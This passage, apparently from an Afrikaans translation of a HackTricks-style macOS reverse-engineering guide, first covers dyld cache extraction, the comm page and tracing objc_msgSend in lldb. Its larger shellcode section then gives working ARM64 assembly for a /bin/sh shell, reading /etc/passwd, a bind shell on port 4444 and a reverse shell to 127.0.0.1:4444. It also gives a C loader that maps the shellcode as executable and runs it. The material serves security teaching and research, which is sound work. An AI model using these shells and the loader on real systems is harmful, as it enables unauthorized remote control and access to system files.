dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Let wel dat **Ida** en **Ghidra** ook **spesifieke dylibs** uit die cache kan dekompileer net deur die cache te oorhandig.

> [!TIP]
> Soms is dit makliker om die **gedekompleerde** kode van **`libsystem_kernel.dylib`** te kyk **as** om die **bronkode** te kyk omdat die kode van verskeie syscalls (BSD en Mach) via skripte gegenereer word (kyk kommentaar in die bronkode) terwyl jy in die dylib kan vind wat aangeroep word.

### machdep oproepe

XNU ondersteun 'n ander tipe oproepe wat masjienafhanklik genoem word. Die getalle van hierdie oproepe hang af van die argitektuur en geen van die oproepe of getalle is gewaarborg om konstant te bly nie.

### comm bladsy

Dit is 'n kern eienaar geheue bladsy wat in die adresruimte van elke gebruikersproses gemap is. Dit is bedoel om die oorgang van gebruikersmodus na kernruimte vinniger te maak as om syscalls te gebruik vir kerndienste wat so baie gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.

Byvoorbeeld, die oproep `gettimeofdate` lees die waarde van `timeval` direk van die comm bladsy.

### objc_msgSend

Dit is baie algemeen om hierdie funksie in Objective-C of Swift programme te vind. Hierdie funksie laat jou toe om 'n metode van 'n Objective-C objek aan te roep.

Parameters ([meer inligting in die dokumentasie](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Wys na die instansie
- x1: op -> Selektor van die metode
- x2... -> Res van die argumente van die aangeroepte metode

So, as jy 'n breekpunt voor die tak na hierdie funksie plaas, kan jy maklik vind wat in lldb aangeroep word (in hierdie voorbeeld roep die objek 'n objek van `NSConcreteTask` aan wat 'n opdrag sal uitvoer):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Deur die omgewing veranderlike **`NSObjCMessageLoggingEnabled=1`** in te stel, is dit moontlik om te log wanneer hierdie funksie in 'n lêer soos `/tmp/msgSends-pid` aangeroep word.
>
> Boonop, deur **`OBJC_HELP=1`** in te stel en enige binêre aan te roep, kan jy ander omgewing veranderlikes sien wat jy kan gebruik om **log** te maak wanneer sekere Objc-C aksies plaasvind.

Wanneer hierdie funksie aangeroep word, is dit nodig om die aangeroepte metode van die aangeduide instansie te vind, hiervoor word verskillende soektogte gedoen:

- Voer optimistiese kassoektog uit:
- As suksesvol, klaar
- Verkry runtimeLock (lees)
- As (realiseer && !cls->realized) realiseer klas
- As (initialize && !cls->initialized) inisieer klas
- Probeer klas se eie kas:
- As suksesvol, klaar
- Probeer klas metode lys:
- As gevind, vul kas en klaar
- Probeer superklas kas:
- As suksesvol, klaar
- Probeer superklas metode lys:
- As gevind, vul kas en klaar
- As (resolver) probeer metode resolver, en herhaal vanaf klas soektog
- As ek nog hier is (= alles anders het gefaal) probeer voorwaarts

### Shellcodes

Om te kompileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die bytes te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem uit [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik. 

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="met stap"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="met adr vir linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n array van parameters (wat in geheue 'n stapel van die adresse beteken).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Roep opdrag met sh vanaf 'n fork sodat die hoofproses nie doodgemaak word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell van [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Van [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
